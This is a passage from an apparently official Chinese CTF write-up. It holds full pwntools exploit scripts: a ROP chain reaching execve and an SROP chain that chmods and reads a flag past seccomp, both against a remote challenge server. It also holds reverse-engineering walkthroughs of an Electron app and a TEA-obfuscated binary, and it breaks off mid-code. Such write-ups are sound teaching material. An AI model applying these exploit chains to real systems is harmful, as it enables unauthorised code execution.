class="number">0x00000000004017cf</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004437a0</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">payload += p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rax;ret&#x27;</span>),executable = <span class="literal">True</span>)))</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;syscall&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendafter(<span class="string">&quot;please input:\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a><strong>seccomp</strong></h4><p>flag文件是没有read权限的,srop要先调用chmod改flag文件权限,再orw输出flag文件内容<br>srop的frame直接写到bss段<br>payload2的作用是栈迁移到bss段启动srop</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># A script for pwn exp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;Linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;47.108.206.43&#x27;,26920)#47.108.206.43:20624</span></span><br><span class="line">p=remote(<span class="string">&#x27;121.196.193.233&#x27;</span>,<span class="number">49183</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;/home/kali/Desktop/my_chall/srop_seccomp/dockerfile/bin/chall&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;/home/kali/Desktop/my_chall/srop_seccomp/dockerfile/bin/chall&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;[PAUSE]&quot;</span>)</span><br><span class="line"><span class="comment">#gadgets</span></span><br><span class="line">mov_rax_0xf = <span class="number">0x401193</span></span><br><span class="line">leave_ret = <span class="number">0x40136c</span></span><br><span class="line">ret_addr = <span class="number">0x401016</span></span><br><span class="line">syscall_addr = rop.find_gadget([<span class="string">&#x27;syscall&#x27;</span>]).address</span><br><span class="line">syscall_ret_addr = <span class="number">0x401186</span> <span class="comment">#full function</span></span><br><span class="line"><span class="comment">#rsi</span></span><br><span class="line">data_addr = <span class="number">0x404000</span></span><br><span class="line">bss_addr = <span class="number">0x404060</span></span><br><span class="line"><span class="comment">#init frame</span></span><br><span class="line">frame_read_1 = SigreturnFrame()</span><br><span class="line">frame_read_1.rax = <span class="number">0</span></span><br><span class="line">frame_read_1.rdi = <span class="number">0</span></span><br><span class="line">frame_read_1.rsi = data_addr</span><br><span class="line">frame_read_1.rdx = <span class="number">0x5a</span></span><br><span class="line">frame_read_1.rsp = <span class="number">0x404178</span> <span class="comment">#指向payload中邻接的mov_rax_0xf在bss段的地址</span></span><br><span class="line">frame_read_1.rip = syscall_ret_addr</span><br><span class="line">frame_chmod = SigreturnFrame()</span><br><span class="line">frame_chmod.rax = <span class="number">0x5a</span></span><br><span class="line">frame_chmod.rdi = data_addr</span><br><span class="line">frame_chmod.rsi = <span class="number">7</span></span><br><span class="line">frame_chmod.rsp = <span class="number">0x404280</span> <span class="comment">#指向payload中邻接的mov_rax_0xf在bss段的地址</span></span><br><span class="line">frame_chmod.rip = syscall_ret_addr</span><br><span class="line">frame_open = SigreturnFrame()</span><br><span class="line">frame_open.rax = <span class="number">0x02</span></span><br><span class="line">frame_open.rdi = data_addr</span><br><span class="line">frame_open.rsi = constants.O_RDONLY</span><br><span class="line">frame_open.rdx = <span class="number">0</span></span><br><span class="line">frame_open.rsp = <span class="number">0x404388</span> <span class="comment"># 指向payload中邻接的mov_rax_0xf在bss段的地址</span></span><br><span class="line">frame_open.rip = syscall_ret_addr</span><br><span class="line"><span class="comment">#read flag</span></span><br><span class="line">frame_read_2 = SigreturnFrame()</span><br><span class="line">frame_read_2.rax = <span class="number">0</span></span><br><span class="line">frame_read_2.rdi = <span class="number">3</span></span><br><span class="line">frame_read_2.rsi = <span class="number">0x405000</span></span><br><span class="line">frame_read_2.rdx = <span class="number">0x30</span></span><br><span class="line">frame_read_2.rsp = <span class="number">0x404490</span> <span class="comment">#指向payload中邻接的mov_rax_0xf在bss段的地址</span></span><br><span class="line">frame_read_2.rip = syscall_ret_addr</span><br><span class="line">frame_write = SigreturnFrame()</span><br><span class="line">frame_write.rax = <span class="number">0x01</span></span><br><span class="line">frame_write.rdi = <span class="number">1</span></span><br><span class="line">frame_write.rsi = <span class="number">0x405000</span></span><br><span class="line">frame_write.rdx = <span class="number">0x30</span></span><br><span class="line">frame_write.rip = syscall_addr</span><br><span class="line"><span class="comment">#bss</span></span><br><span class="line">payload1 = p64(ret_addr) + p64(ret_addr)</span><br><span class="line">payload1 += p64(mov_rax_0xf) + p64(syscall_addr)</span><br><span class="line">payload1 += <span class="built_in">bytes</span>(frame_read_1)</span><br><span class="line">payload1 += p64(mov_rax_0xf) + p64(syscall_addr)</span><br><span class="line">payload1 += <span class="built_in">bytes</span>(frame_chmod)</span><br><span class="line">payload1 += p64(mov_rax_0xf) + p64(syscall_addr)</span><br><span class="line">payload1 += <span class="built_in">bytes</span>(frame_open)</span><br><span class="line">payload1 += p64(mov_rax_0xf) + p64(syscall_addr)</span><br><span class="line">payload1 += <span class="built_in">bytes</span>(frame_read_2)</span><br><span class="line">payload1 += p64(mov_rax_0xf) + p64(syscall_addr)</span><br><span class="line">payload1 += <span class="built_in">bytes</span>(frame_write)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;easyhack\n&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="comment">#Stack Migration</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">42</span> + p64(bss_addr) + p64(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Do u know what is SUID?\n&quot;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">&#x27;./flag\x00&#x27;</span>.ljust(<span class="number">0x5a</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Resverse"><a href="#Resverse" class="headerlink" title="Resverse"></a><strong>Resverse</strong></h2><h3 id="elec-go"><a href="#elec-go" class="headerlink" title="elec_go"></a><strong>elec_go</strong></h3><p><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733822273-30695272-9d90-4519-b4ae-b3ab09858191.png" alt="image.png"><br>一个普通的electron程序<br>主程序都被封装到了resources&#x2F;app.asar里<br>进入resources目录 解包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS D:\Electron\elec_go\elec_go-win32-x64\resources&gt; asar extract .\app.asar ./tmp</span><br></pre></td></tr></table></figure>

<p>src里是主要程序 node_modules只是一些包<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733822268-c1a18a92-fcc6-4185-bd02-6bf995437065.png" alt="image.png"><br>index.js 中是主程序，preload.js是浏览器预先加载的一些脚本，renderer.js是用于建立主程序与浏览器通信的设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a---           2024/5/26    20:17            377 index.css</span><br><span class="line">-a---           2024/5/26    20:17            385 index.html</span><br><span class="line">-a---           2024/5/26    20:17           8785 index.js</span><br><span class="line">-a---           2024/5/26    20:17           7597 preload.js</span><br><span class="line">-a---           2024/5/26    20:17            136 renderer.js</span><br></pre></td></tr></table></figure>

<p>第一种做法<br>如果纯逆的话，步骤如下<br>1.查看preload.js<br>2.用node运行下面的js脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const escodegen=require(&quot;escodegen&quot;)</span><br><span class="line">const escodegen=require(&quot;escodegen&quot;)</span><br><span class="line">console.log(escodegen.generate(JSON.parse(Buffer(&#x27;eyJ0eXBlIjoiUHJvZ3JhbSIsInN0YXJ0IjowLCJlbmQiOjI0MCwiYm9keSI6W3sidHlwZSI6IkV4cHJlc3Npb25TdGF0ZW1lbnQiLCJzdGFydCI6MCwiZW5kIjoyNDAsImV4cHJlc3Npb24iOnsidHlwZSI6IkFycm93RnVuY3Rpb25FeHByZXNzaW9uIiwic3RhcnQiOjAsImVuZCI6MjQwLCJpZCI6bnVsbCwiZXhwcmVzc2lvbiI6ZmFsc2UsImdlbmVyYXRvciI6ZmFsc2UsImFzeW5jIjpmYWxzZSwicGFyYW1zIjpbXSwiYm9keSI6eyJ0eXBlIjoiQmxvY2tTdGF0ZW1lbnQiLCJzdGFydCI6NCwiZW5kIjoyNDAsImJvZHkiOlt7InR5cGUiOiJWYXJpYWJsZURlY2xhcmF0aW9uIiwic3RhcnQiOjksImVuZCI6MzcsImRlY2xhcmF0aW9ucyI6W3sidHlwZSI6IlZhcmlhYmxlRGVjbGFyYXRvciIsInN0YXJ0IjoxNSwiZW5kIjozNywiaWQiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6MTUsImVuZCI6MjAsIm5hbWUiOiJrb2ZmaSJ9LCJpbml0Ijp7InR5cGUiOiJDYWxsRXhwcmVzc2lvbiIsInN0YXJ0IjoyMSwiZW5kIjozNywiY2FsbGVlIjp7InR5cGUiOiJJZGVudGlmaWVyIiwic3RhcnQiOjIxLCJlbmQiOjI4LCJuYW1lIjoicmVxdWlyZSJ9LCJhcmd1bWVudHMiOlt7InR5cGUiOiJMaXRlcmFsIiwic3RhcnQiOjI5LCJlbmQiOjM2LCJ2YWx1ZSI6ImtvZmZpIiwicmF3IjoiXCJrb2ZmaVwiIn1dLCJvcHRpb25hbCI6ZmFsc2V9fV0sImtpbmQiOiJjb25zdCJ9LHsidHlwZSI6IlZhcmlhYmxlRGVjbGFyYXRpb24iLCJzdGFydCI6NDEsImVuZCI6NzQsImRlY2xhcmF0aW9ucyI6W3sidHlwZSI6IlZhcmlhYmxlRGVjbGFyYXRvciIsInN0YXJ0Ijo0NywiZW5kIjo3NCwiaWQiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6NDcsImVuZCI6NTAsIm5hbWUiOiJsaWIifSwiaW5pdCI6eyJ0eXBlIjoiQ2FsbEV4cHJlc3Npb24iLCJzdGFydCI6NTEsImVuZCI6NzQsImNhbGxlZSI6eyJ0eXBlIjoiTWVtYmVyRXhwcmVzc2lvbiIsInN0YXJ0Ijo1MSwiZW5kIjo2MSwib2JqZWN0Ijp7InR5cGUiOiJJZGVudGlmaWVyIiwic3RhcnQiOjUxLCJlbmQiOjU2LCJuYW1lIjoia29mZmkifSwicHJvcGVydHkiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6NTcsImVuZCI6NjEsIm5hbWUiOiJsb2FkIn0sImNvbXB1dGVkIjpmYWxzZSwib3B0aW9uYWwiOmZhbHNlfSwiYXJndW1lbnRzIjpbeyJ0eXBlIjoiTGl0ZXJhbCIsInN0YXJ0Ijo2MiwiZW5kIjo3MywidmFsdWUiOiJteWRsbC5kbGwiLCJyYXciOiJcIm15ZGxsLmRsbFwiIn1dLCJvcHRpb25hbCI6ZmFsc2V9fV0sImtpbmQiOiJjb25zdCJ9LHsidHlwZSI6IlZhcmlhYmxlRGVjbGFyYXRpb24iLCJzdGFydCI6NzgsImVuZCI6MTI2LCJkZWNsYXJhdGlvbnMiOlt7InR5cGUiOiJWYXJpYWJsZURlY2xhcmF0b3IiLCJzdGFydCI6ODQsImVuZCI6MTI2LCJpZCI6eyJ0eXBlIjoiSWRlbnRpZmllciIsInN0YXJ0Ijo4NCwiZW5kIjo4OCwibmFtZSI6ImZ1bmMifSwiaW5pdCI6eyJ0eXBlIjoiQ2FsbEV4cHJlc3Npb24iLCJzdGFydCI6ODksImVuZCI6MTI2LCJjYWxsZWUiOnsidHlwZSI6Ik1lbWJlckV4cHJlc3Npb24iLCJzdGFydCI6ODksImVuZCI6OTcsIm9iamVjdCI6eyJ0eXBlIjoiSWRlbnRpZmllciIsInN0YXJ0Ijo4OSwiZW5kIjo5MiwibmFtZSI6ImxpYiJ9LCJwcm9wZXJ0eSI6eyJ0eXBlIjoiSWRlbnRpZmllciIsInN0YXJ0Ijo5MywiZW5kIjo5NywibmFtZSI6ImZ1bmMifSwiY29tcHV0ZWQiOmZhbHNlLCJvcHRpb25hbCI6ZmFsc2V9LCJhcmd1bWVudHMiOlt7InR5cGUiOiJMaXRlcmFsIiwic3RhcnQiOjk4LCJlbmQiOjEyNSwidmFsdWUiOiJjaGFyKiBPdXRwdXQoY2hhciogaW5wdXQpIiwicmF3IjoiXCJjaGFyKiBPdXRwdXQoY2hhciogaW5wdXQpXCIifV0sIm9wdGlvbmFsIjpmYWxzZX19XSwia2luZCI6ImNvbnN0In0seyJ0eXBlIjoiRXhwcmVzc2lvblN0YXRlbWVudCIsInN0YXJ0IjoxMzAsImVuZCI6MTM2LCJleHByZXNzaW9uIjp7InR5cGUiOiJBc3NpZ25tZW50RXhwcmVzc2lvbiIsInN0YXJ0IjoxMzAsImVuZCI6MTM2LCJvcGVyYXRvciI6Ij0iLCJsZWZ0Ijp7InR5cGUiOiJJZGVudGlmaWVyIiwic3RhcnQiOjEzMCwiZW5kIjoxMzMsIm5hbWUiOiJ0bXAifSwicmlnaHQiOnsidHlwZSI6Ik9iamVjdEV4cHJlc3Npb24iLCJzdGFydCI6MTM0LCJlbmQiOjEzNiwicHJvcGVydGllcyI6W119fX0seyJ0eXBlIjoiRXhwcmVzc2lvblN0YXRlbWVudCIsInN0YXJ0IjoxNDAsImVuZCI6MjM4LCJleHByZXNzaW9uIjp7InR5cGUiOiJBc3NpZ25tZW50RXhwcmVzc2lvbiIsInN0YXJ0IjoxNDAsImVuZCI6MjM4LCJvcGVyYXRvciI6Ij0iLCJsZWZ0Ijp7InR5cGUiOiJNZW1iZXJFeHByZXNzaW9uIiwic3RhcnQiOjE0MCwiZW5kIjoxNjIsIm9iamVjdCI6eyJ0eXBlIjoiTWVtYmVyRXhwcmVzc2lvbiIsInN0YXJ0IjoxNDAsImVuZCI6MTUzLCJvYmplY3QiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6MTQwLCJlbmQiOjE0MywibmFtZSI6InRtcCJ9LCJwcm9wZXJ0eSI6eyJ0eXBlIjoiSWRlbnRpZmllciIsInN0YXJ0IjoxNDQsImVuZCI6MTUzLCJuYW1lIjoiX19wcm90b19fIn0sImNvbXB1dGVkIjpmYWxzZSwib3B0aW9uYWwiOmZhbHNlfSwicHJvcGVydHkiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6MTU0LCJlbmQiOjE2MiwibmFtZSI6InRvU3RyaW5nIn0sImNvbXB1dGVkIjpmYWxzZSwib3B0aW9uYWwiOmZhbHNlfSwicmlnaHQiOnsidHlwZSI6IkFycm93RnVuY3Rpb25FeHByZXNzaW9uIiwic3RhcnQiOjE2MywiZW5kIjoyMzgsImlkIjpudWxsLCJleHByZXNzaW9uIjpmYWxzZSwiZ2VuZXJhdG9yIjpmYWxzZSwiYXN5bmMiOmZhbHNlLCJwYXJhbXMiOltdLCJib2R5Ijp7InR5cGUiOiJCbG9ja1N0YXRlbWVudCIsInN0YXJ0IjoxNjcsImVuZCI6MjM4LCJib2R5IjpbeyJ0eXBlIjoiUmV0dXJuU3RhdGVtZW50Iiwic3RhcnQiOjE2OCwiZW5kIjoyMzcsImFyZ3VtZW50Ijp7InR5cGUiOiJDYWxsRXhwcmVzc2lvbiIsInN0YXJ0IjoxNzUsImVuZCI6MjM3LCJjYWxsZWUiOnsidHlwZSI6Ik1lbWJlckV4cHJlc3Npb24iLCJzdGFydCI6MTc1LCJlbmQiOjIzMSwib2JqZWN0Ijp7InR5cGUiOiJBcnJheUV4cHJlc3Npb24iLCJzdGFydCI6MTc1LCJlbmQiOjIyNSwiZWxlbWVudHMiOlt7InR5cGUiOiJTcHJlYWRFbGVtZW50Iiwic3RhcnQiOjE3NiwiZW5kIjoyMjQsImFyZ3VtZW50Ijp7InR5cGUiOiJDYWxsRXhwcmVzc2lvbiIsInN0YXJ0IjoxNzksImVuZCI6MjI0LCJjYWxsZWUiOnsidHlwZSI6Ik1lbWJlckV4cHJlc3Npb24iLCJzdGFydCI6MTc5LCJlbmQiOjE4OSwib2JqZWN0Ijp7InR5cGUiOiJJZGVudGlmaWVyIiwic3RhcnQiOjE3OSwiZW5kIjoxODMsIm5hbWUiOiJKU09OIn0sInByb3BlcnR5Ijp7InR5cGUiOiJJZGVudGlmaWVyIiwic3RhcnQiOjE4NCwiZW5kIjoxODksIm5hbWUiOiJwYXJzZSJ9LCJjb21wdXRlZCI6ZmFsc2UsIm9wdGlvbmFsIjpmYWxzZX0sImFyZ3VtZW50cyI6W3sidHlwZSI6IkNhbGxFeHByZXNzaW9uIiwic3RhcnQiOjE5MCwiZW5kIjoyMjMsImNhbGxlZSI6eyJ0eXBlIjoiTWVtYmVyRXhwcmVzc2lvbiIsInN0YXJ0IjoxOTAsImVuZCI6MjEyLCJvYmplY3QiOnsidHlwZSI6IkNhbGxFeHByZXNzaW9uIiwic3RhcnQiOjE5MCwiZW5kIjoyMDQsImNhbGxlZSI6eyJ0eXBlIjoiSWRlbnRpZmllciIsInN0YXJ0IjoxOTAsImVuZCI6MTk0LCJuYW1lIjoiZnVuYyJ9LCJhcmd1bWVudHMiOlt7InR5cGUiOiJMaXRlcmFsIiwic3RhcnQiOjE5NSwiZW5kIjoyMDMsInZhbHVlIjoiZmFrZX5+IiwicmF3IjoiXCJmYWtlfn5cIiJ9XSwib3B0aW9uYWwiOmZhbHNlfSwicHJvcGVydHkiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6MjA1LCJlbmQiOjIxMiwibmFtZSI6InJlcGxhY2UifSwiY29tcHV0ZWQiOmZhbHNlLCJvcHRpb25hbCI6ZmFsc2V9LCJhcmd1bWVudHMiOlt7InR5cGUiOiJMaXRlcmFsIiwic3RhcnQiOjIxMywiZW5kIjoyMTcsInZhbHVlIjp7fSwicmF3IjoiLyAvZyIsInJlZ2V4Ijp7InBhdHRlcm4iOiIgIiwiZmxhZ3MiOiJnIn19LHsidHlwZSI6IkxpdGVyYWwiLCJzdGFydCI6MjE5LCJlbmQiOjIyMiwidmFsdWUiOiIsIiwicmF3IjoiJywnIn1dLCJvcHRpb25hbCI6ZmFsc2V9XSwib3B0aW9uYWwiOmZhbHNlfX1dfSwicHJvcGVydHkiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6MjI2LCJlbmQiOjIzMSwibmFtZSI6InNsaWNlIn0sImNvbXB1dGVkIjpmYWxzZSwib3B0aW9uYWwiOmZhbHNlfSwiYXJndW1lbnRzIjpbeyJ0eXBlIjoiTGl0ZXJhbCIsInN0YXJ0IjoyMzIsImVuZCI6MjMzLCJ2YWx1ZSI6MCwicmF3IjoiMCJ9LHsidHlwZSI6IkxpdGVyYWwiLCJzdGFydCI6MjM0LCJlbmQiOjIzNiwidmFsdWUiOjE2LCJyYXciOiIxNiJ9XSwib3B0aW9uYWwiOmZhbHNlfX1dfX19fV19fX1dLCJzb3VyY2VUeXBlIjoic2NyaXB0In0=&#x27;,&#x27;base64&#x27;).toString())))</span><br></pre></td></tr></table></figure>

<p>输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() =&gt; &#123;</span><br><span class="line">    const koffi = require(&#x27;koffi&#x27;);//一个普通的loadlibrary</span><br><span class="line">    const lib = koffi.load(&#x27;mydll.dll&#x27;);</span><br><span class="line">    const func = lib.func(&#x27;char* Output(char* input)&#x27;);</span><br><span class="line">    tmp = &#123;&#125;;</span><br><span class="line">    tmp.__proto__.toString = () =&gt; &#123;</span><br><span class="line">        return [...JSON.parse(func(&#x27;fake~~&#x27;).replace(/ /g, &#x27;,&#x27;))].slice(0, 16);//一个普通的原型链污染</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后分析dll(根目录下的mydll.dll)<br>对应的Output函数<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733822488-d9615fb7-f1bf-49a1-9907-8688482c07bb.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// main.Output</span><br><span class="line">__int8 *__golang main_Output(__int8 *input)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // r14</span><br><span class="line">  __int128 v2; // xmm15</span><br><span class="line">  void *v3; // rax</span><br><span class="line">  retval_3AE7B1440 v; // [rsp+24h] [rbp-69Ch] BYREF</span><br><span class="line">  _OWORD a[104]; // [rsp+38h] [rbp-688h] BYREF</span><br><span class="line">  string v7; // 0:rax.8,8:rbx.8</span><br><span class="line">  _slice_interface_ v8; // 0:rax.8,8:rbx.8,16:rcx.8</span><br><span class="line"></span><br><span class="line">  if ( (unsigned __int64)&amp;a[4] + 8 &lt;= *(_QWORD *)(v1 + 16) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(0x3AE7B257ALL);</span><br><span class="line">  &#125;</span><br><span class="line">  memset(&amp;a[1], 0, 0x670uLL);</span><br><span class="line">  *(_QWORD *)&amp;a[1] = &quot;Dragon Knight&quot;;</span><br><span class="line">  *((_QWORD *)&amp;a[1] + 1) = 13LL;</span><br><span class="line">  main_sha1PadMessage((main_SHA1Context *)&amp;a[1]);</span><br><span class="line">  main_sha1ProcessMessageBlock((main_SHA1Context *)&amp;a[1]);</span><br><span class="line">  v = main_sha1_digest((main_SHA1Context *)&amp;a[1]);</span><br><span class="line">  a[0] = v2;</span><br><span class="line">  v3 = runtime_convTnoptr((runtime__type *)&amp;RTYPE__20_uint8, &amp;v);</span><br><span class="line">  *(_QWORD *)&amp;a[0] = &amp;RTYPE__20_uint8;</span><br><span class="line">  *((_QWORD *)&amp;a[0] + 1) = v3;</span><br><span class="line">  v8.array = (interface_ *)a;</span><br><span class="line">  v8.len = 1LL;</span><br><span class="line">  v8.cap = 1LL;</span><br><span class="line">  v7 = fmt_Sprintln(v8);</span><br><span class="line">  return main__Cfunc_CString(v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上是个固定输出的sha1，sha1的输入为”Dragon Knight”<br>输出即为0f0d105e8ec0eb28e43dfff700c32fe145949c5c(实际是个字节数组),同时通过slice取的其前16字节污染Object原型的toString元素<br>通过<code>toString(&quot;never gonna give you up&quot;)</code>将被污染的<code>0f0d105e8ec0eb28e43dfff700c32fe1</code>发送给index.js<br>再看index.js<br>base64语句实际上就是这个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(event, arg) =&gt; &#123;</span><br><span class="line">    c = CryptoJS.AES.encrypt(arg, k3y, &#123;</span><br><span class="line">        mode: CryptoJS.mode.ECB,</span><br><span class="line">        padding: CryptoJS.pad.ZeroPadding</span><br><span class="line">    &#125;);</span><br><span class="line">    if (c.toString() == &#x27;wPUqm+0VU9uX0knpKIWxFilCSO6tae50LTUi0U41Tag=&#x27;) &#123;</span><br><span class="line">        dialog.showMessageBox(&#123;</span><br><span class="line">            title: &#x27;正确\uFF01&#x27;,</span><br><span class="line">            message: &#x27;right!&#x27;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        dialog.showMessageBox(&#123;</span><br><span class="line">            title: &#x27;错误\uFF01&#x27;,</span><br><span class="line">            message: &#x27;NO!!!!!&#x27;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>密文就是<code>wPUqm+0VU9uX0knpKIWxFilCSO6tae50LTUi0U41Tag=</code>而key就是<code>0f0d105e8ec0eb28e43dfff700c32fe1</code> 加密方式AES-ECB-NoPadding<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733822326-61cd8a74-2de9-4855-8cbd-87116c4ff883.png" alt="image.png"><br>另一种做法<br>将app.asar的导出文件全部放在resources目录下的app目录(自己新建)<br>更改index.js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipcMain.on(&#x27;k3y&#x27;,(event,argk)=&gt;&#123;</span><br><span class="line">    var k3y=CryptoJS.lib.WordArray.create(new Uint8Array(argk))</span><br><span class="line">        ipcMain.on(&#x27;flag&#x27;,(event,arg)=&gt;&#123;</span><br><span class="line">            func=(event, arg) =&gt; &#123;</span><br><span class="line">                dialog.showMessageBox(&#123;</span><br><span class="line">                    title:&quot;abc&quot;,</span><br><span class="line">                    message:CryptoJS.AES.decrypt(</span><br><span class="line">                    &#x27;wPUqm+0VU9uX0knpKIWxFilCSO6tae50LTUi0U41Tag=&#x27;,k3y,&#123;</span><br><span class="line">                    mode: CryptoJS.mode.ECB,</span><br><span class="line">                    padding: CryptoJS.pad.ZeroPadding</span><br><span class="line">                &#125;).toString(CryptoJS.enc.Utf8)&#125;)</span><br><span class="line">            &#125;; </span><br><span class="line">            func(event,arg); </span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>也能达成直接爆flag的效果<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733822274-764379f7-de53-4a02-9bbc-0339cc78f752.png" alt="image.png"></p>
<h3 id="flower-tea"><a href="#flower-tea" class="headerlink" title="flower_tea"></a><strong>flower_tea</strong></h3><p>考点：花指令去除，tea算法<br>观察main函数：<br>主函数的大概是这样。<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733828856-dd977d3e-329b-4748-adea-648e1ca77d81.png" alt="image.png"><br>如果要调试，要先把第一个函数nop掉（实际上并不用）<br>这里先看encode函数，点开后是爆红的，所以先解花指令<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733828863-fffea6a3-e0ed-4f7f-bd78-ba319fdb93b0.png" alt="image.png"><br>这个是一个简单的jmp花指令，把后面的jmp nop掉，然后可以看到第一部分。<br>这时最上面还是有标红<br>在汇编界面看看哪里还有花<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733828840-9379adb2-bb79-47ec-8e66-6b0b6186244b.png" alt="image.png"><br>这里有一个奇怪的call：<br>逻辑是：call完之后把ret的值+0xC然后返回<br>把这一部分按u解除，在加0xC后的位置再反编译<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733828855-22c55bc8-7fc2-4b83-8efb-7c1c9f6b986d.png" alt="image.png"><br>所以ret之后就会到pop的位置<br>把中间这一段全部nop，然后把整个函数u，然后c，再浏览一下函数，中间有一个怪jmp，删掉<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733828869-884a2f60-9285-4f64-90a8-423fd0e572e7.png" alt="image.png"><br>然后再p，得到解完花的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall encode(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rcx</span><br><span class="line">  int v3; // eax</span><br><span class="line">  bool v4; // zf</span><br><span class="line">  int v5; // eax</span><br><span class="line">  int v7; // [rsp+2Ch] [rbp-34h]</span><br><span class="line">  int v8; // [rsp+30h] [rbp-30h]</span><br><span class="line">  unsigned int i; // [rsp+34h] [rbp-2Ch]</span><br><span class="line">  unsigned int v10; // [rsp+38h] [rbp-28h]</span><br><span class="line">  unsigned int v11; // [rsp+3Ch] [rbp-24h]</span><br><span class="line">  unsigned int v12; // [rsp+40h] [rbp-20h]</span><br><span class="line">  int v13; // [rsp+44h] [rbp-1Ch]</span><br><span class="line">  _BYTE v15[12]; // [rsp+54h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;v15[4] = a1;</span><br><span class="line">  *(_DWORD *)v15 = 0x9E3779B9;</span><br><span class="line">  v8 = 9;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = *(_DWORD *)(a1 + 56);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v10 -= 0x61C88647;</span><br><span class="line">    v7 = (v10 &gt;&gt; 2) &amp; 3;</span><br><span class="line">    for ( i = 0; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = 14i64;</span><br><span class="line">      if ( i &gt;= 0xE )</span><br><span class="line">        break;</span><br><span class="line">      v12 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * (i + 1));</span><br><span class="line">      v3 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i)</span><br><span class="line">         + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (v12 ^ v10)) ^ (((16 * v11) ^ (v12 &gt;&gt; 3))</span><br><span class="line">                                                                           + ((4 * v12) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">      *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i) = v3;</span><br><span class="line">      v11 = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = **(_QWORD **)&amp;v15[4] == 